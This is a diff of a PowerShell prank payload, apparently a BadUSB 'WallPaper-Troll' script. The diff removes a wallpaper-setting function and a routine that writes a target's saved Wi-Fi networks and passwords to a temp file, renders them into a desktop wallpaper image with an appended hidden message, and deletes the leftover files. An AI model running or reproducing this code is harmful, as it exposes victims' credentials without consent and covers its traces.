@@ -33,7 +33,7 @@
 # Variables
 
 
-$s=New-Object -ComObject SAPI.SpVoice
+
 
 ############################################################################################################################################################
 
@@ -281,139 +281,9 @@ $h = [PInvoke]::GetDeviceCaps($hdc, 117) # height
 	This will take the image you generated and set it as the targets wall paper
 #>
 
-Function Set-WallPaper {
- 
-<#
- 
-    .SYNOPSIS
-    Applies a specified wallpaper to the current user's desktop
-    
-    .PARAMETER Image
-    Provide the exact path to the image
- 
-    .PARAMETER Style
-    Provide wallpaper style (Example: Fill, Fit, Stretch, Tile, Center, or Span)
-  
-    .EXAMPLE
-    Set-WallPaper -Image "C:\Wallpaper\Default.jpg"
-    Set-WallPaper -Image "C:\Wallpaper\Background.jpg" -Style Fit
-  
-#>
 
- 
-param (
-    [parameter(Mandatory=$True)]
-    # Provide path to image
-    [string]$Image,
-    # Provide wallpaper style that you would like applied
-    [parameter(Mandatory=$False)]
-    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
-    [string]$Style
-)
- 
-$WallpaperStyle = Switch ($Style) {
-  
-    "Fill" {"10"}
-    "Fit" {"6"}
-    "Stretch" {"2"}
-    "Tile" {"0"}
-    "Center" {"0"}
-    "Span" {"22"}
-  
-}
- 
-If($Style -eq "Tile") {
- 
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
- 
-}
-Else {
- 
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
- 
-}
- 
-Add-Type -TypeDefinition @" 
-using System; 
-using System.Runtime.InteropServices;
-  
-public class Params
-{ 
-    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
-    public static extern int SystemParametersInfo (Int32 uAction, 
-                                                   Int32 uParam, 
-                                                   String lpvParam, 
-                                                   Int32 fuWinIni);
-}
-"@ 
-  
-    $SPI_SETDESKWALLPAPER = 0x0014
-    $UpdateIniFile = 0x01
-    $SendChangeEvent = 0x02
-  
-    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
-  
-    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
-}
 
 #############################################################################################################################################
-
-Function WallPaper-Troll {
-
-if (!$Networks) { Write-Host "variable is null" 
-}else { 
-
-	# This is the name of the file the networks and passwords are saved 
-
-	$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_WiFi-PWD.txt"
-
-	($Networks| Out-String) >> $Env:temp\$FileName
-
-	$content = [IO.File]::ReadAllText("$Env:temp\$FileName")
-
-
-# this is the message that will be coded into the image you use as the wallpaper
-
-	$hiddenMessage = "`n`nMy crime is that of curiosity `nand yea curiosity killed the cat `nbut satisfaction brought him back `n with love -Jakoby"
-
-# this will be the name of the image you use as the wallpaper
-
-	$ImageName = "dont-be-suspicious"
-
-<#
-
-.NOTES  
-	This will get take the information gathered and format it into a .jpg
-#>
-
-	Add-Type -AssemblyName System.Drawing
-
-	$filename = "$env:tmp\foo.jpg" 
-	$bmp = new-object System.Drawing.Bitmap $w,$h 
-	$font = new-object System.Drawing.Font Consolas,18 
-	$brushBg = [System.Drawing.Brushes]::White 
-	$brushFg = [System.Drawing.Brushes]::Black 
-	$graphics = [System.Drawing.Graphics]::FromImage($bmp) 
-	$graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height) 
-	$graphics.DrawString($content,$font,$brushFg,500,100) 
-	$graphics.Dispose() 
-	$bmp.Save($filename) 
-
-# Invoke-Item $filename 
-
-<#
-
-.NOTES 
-	This will take your hidden message and use steganography to hide it in the image you use as the wallpaper 
-	Then it will clean up the files you don't want to leave behind
-#>
-
-	echo $hiddenMessage > $Env:temp\foo.txt
-	cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName.jpg"
-
-	rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
 
 
 #############################################################################################################################################
@@ -636,7 +506,7 @@ echo "it worked"
 
 # this is where your message is spoken line by line
 
-$s=New-Object -ComObject SAPI.SpVoice
+
 
 # This sets how fast Sapi Speaks
 
